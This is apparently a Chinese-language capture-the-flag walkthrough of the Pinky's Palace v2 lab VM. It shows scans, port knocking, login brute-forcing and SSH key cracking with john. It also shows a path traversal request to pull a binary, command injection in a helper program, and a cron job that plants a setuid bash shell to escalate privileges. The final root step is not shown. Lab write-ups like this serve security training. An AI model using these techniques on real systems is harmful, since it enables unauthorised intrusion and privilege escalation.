



### 

根据靶场网页提示，配置本地 DNS 解析，`sudo vim /etc/hosts`![image-20261111183710458](0x12%20-%20Pinkys%20Palace%20v2/image-20261111183710458.png)



### nmap

```shell
nmap -sn 192.168.56.1/24 --min-rate 1000
IP=192.168.56.105
nmap -A $IP -oN nmap.txt -p `nmap -sS -sU -p- -Pn $IP --min-rate 8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

![image-20261111184111033](0x12%20-%20Pinkys%20Palace%20v2/image-20261111184111033.png)

#### 80

##### wpscan

`wpscan --url http://pinkydb/`

```shell
searchsploit twentyseventeen
searchsploit wordpress 4.9
```

![image-20261111184422827](0x12%20-%20Pinkys%20Palace%20v2/image-20261111184422827.png)



`wpscan --url http://pinkydb/ -eu`，-e 是枚举，-u 是user，拿到一个用户，记到 `user.txt` 中![1794400433397](0x12%20-%20Pinkys%20Palace%20v2/1794400433397.png)



##### dirb

`dirb http://pinkydb`

- `http://pinkydb/secret/` -> `http://pinkydb/secret/bambam.txt`

```
mkdir 80
cd 80
wget http://pinkydb/secret/bambam.txt
cat bambam.txt
# 8890
# 7000
# 666
#
# pinkydb
```

其中，前三个数字，考虑是网络通信的端口序列，联想到 Port Knocking（端口敲门）技术

尝试 knock 工具，按照文件中数字出现的顺序依次向目标主机发送敲门请求：`knock 192.168.56.105 8890 7000 666`

通过观察目标主机的响应，进一步验证这组数字是否为有效的端口敲门序列

虽然，这里没有反应

还有一个 `pinkydb`，可能是用户名也可能是密码，分别添加到 `pass.txt`、`user.txt`

- `http://pinkydb/wp-login.php`

用刚刚的 `user.txt`、`pass.txt`，选择 `Cluster bomb` 进行爆破

无果



#### 4655

ssh 先端口往后放





#### 31337

![image-20261111210903228](0x12%20-%20Pinkys%20Palace%20v2/image-20261111210903228.png)

![image-20261111210859153](0x12%20-%20Pinkys%20Palace%20v2/image-20261111210859153.png)



#### 7654

发现一个登录框

- 尝试弱口令

无果

- 尝试 SQL 注入

```
admin' || '1' like '1
admin' or '1'='1
```

无果

- 尝试 sqlmap

bp 抓包后，添加标志注入点

`sqlmap -r req.txt --batch --level 3`![image-20261111211148453](0x12%20-%20Pinkys%20Palace%20v2/image-20261111211148453.png)

- bp 抓包后，通过 `Cluster bomb` 进行爆破

> 利用 cewl，针对网站获取字典
>
> ```shell
> cewl -m 5 http://pinkydb/ -w pass.list
> cat pass.txt >> pass.list
> cat user.txt >> pass.list
> ```

发现一个状态码为 302 的 `username:passwd`

登陆成功

进去之后，发现一个用户名 Stefano，添加到 `user.txt` 中![image-20261111212405060](0x12%20-%20Pinkys%20Palace%20v2/image-20261111212405060.png)



尝试依据该用户名，连接 4655 的 ssh 服务

> ssh 时，linux 用户名，小写开头

ssh 连接时，`Permissions 0660 for 'id_rsa' are too open.`，私钥权限不对

`chmod 0400 id_rsa`

![image-20261112085633316](0x12%20-%20Pinkys%20Palace%20v2/image-20261112085633316.png)

修改文件权限后，再次 ssh，需要私钥密码，尝试爆破

提取私钥哈希，`ssh2john.py id_rsa`，复制粘贴至 hash.txt![image-20261112085826132](0x12%20-%20Pinkys%20Palace%20v2/image-20261112085826132.png)

爆破，`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`，得到结果 `secretzl01`，保存至 pass.txt![image-20261112090101791](0x12%20-%20Pinkys%20Palace%20v2/image-20261112090101791.png)

尝试 ssh 登录，成功拿到 shell![image-20261112090343546](0x12%20-%20Pinkys%20Palace%20v2/image-20261112090343546.png)



在家目录中，发现可执行文件 qsub![image-20261112091106419](0x12%20-%20Pinkys%20Palace%20v2/image-20261112091106419.png)

但是，在当前登录用户状态下

由于权限限制，不可读

由于密码限制，不可写![image-20261112091121357](0x12%20-%20Pinkys%20Palace%20v2/image-20261112091121357.png)





由于该文件属于 www-data 用户组，在期望分析该文件的需求下，我们又重新回到 web 端

在 7654 端口，发现路径穿越+文件包含![image-20261112091250750](0x12%20-%20Pinkys%20Palace%20v2/image-20261112091250750.png)



获取 qsub

```shell
wget http://pinkydb:7654/pageegap.php\?1337\=../../../../../../..//home/stefano/tools/qsub
mv ... qsub
```



`file qsub`，也即 ELF 可执行文件![image-20261112091554307](0x12%20-%20Pinkys%20Palace%20v2/image-20261112091554307.png)





`strings qsub`![image-20261112091905695](0x12%20-%20Pinkys%20Palace%20v2/image-20261112091905695.png)

看到 `/bin/echo %s >> /home/pinky/messages/stefano_msg.txt`

在 %s 处，可以利用分号阶段，去执行命令





用 ida 打开

```
F5
```

分析得到密码，`echo $TERM -> screen`![image-20261112092153438](0x12%20-%20Pinkys%20Palace%20v2/image-20261112092153438.png)





用户枚举看一下![image-20261112092237107](0x12%20-%20Pinkys%20Palace%20v2/image-20261112092237107.png)



由于该 qsub 文件属于 pinky，所以直接 `/bin/bash -p`，获得 pinky 身份 ![image-20261112092355114](0x12%20-%20Pinkys%20Palace%20v2/image-20261112092355114.png)

通过 `~/.bash_history`，发现计划任务 `/usr/local/bin/backup.sh`

发现该文件，属于 demon 用户、pinky 用户组

但是，我们通过 qsub 文件获取的 pinky 身份，还只是 stefano 用户组

这里直接 `newgrp`，去改变所属组，从 stefano 到 pinky![image-20261112092726714](0x12%20-%20Pinkys%20Palace%20v2/image-20261112092726714.png)





利用定时任务 backup.sh，获得 shell

```shell
cp /bin/bash /tmp/shell
chmod ugo+x /tmp/shell
chmod u+s /tmp/shell
```

![image-20261112093123639](0x12%20-%20Pinkys%20Palace%20v2/image-20261112093123639.png)

`bash -p`，获得 bash![image-20261112093400061](0x12%20-%20Pinkys%20Palace%20v2/image-20261112093400061.png)



`ps -aux | grep root`，发现进程 `daemon/panel`![image-20261112093857701](0x12%20-%20Pinkys%20Palace%20v2/image-20261112093857701.png)

`cd daemon`，发现可执行文件 panel

![image-20261112094013519](0x12%20-%20Pinkys%20Palace%20v2/image-20261112094013519.png)

`./panel`，发现端口占用![image-20261112094130296](0x12%20-%20Pinkys%20Palace%20v2/image-20261112094130296.png)

> 可能是跟 `netstat -lntp` 下的 31337 有关![image-20261112094106305](0x12%20-%20Pinkys%20Palace%20v2/image-20261112094106305.png)





下载到本地分析

```
# 靶机
python3 -m http.server --bind 0.0.0.0 8080

# kali
wget http://192.168.56.105:8080/panel
```



运行后没反应，但通过 `netstat -lntp`，可以发现 31337 端口占用![image-20261112094409485](0x12%20-%20Pinkys%20Palace%20v2/image-20261112094409485.png)













拿到 root![image-20261112084942239](0x12%20-%20Pinkys%20Palace%20v2/image-20261112084942239.png)

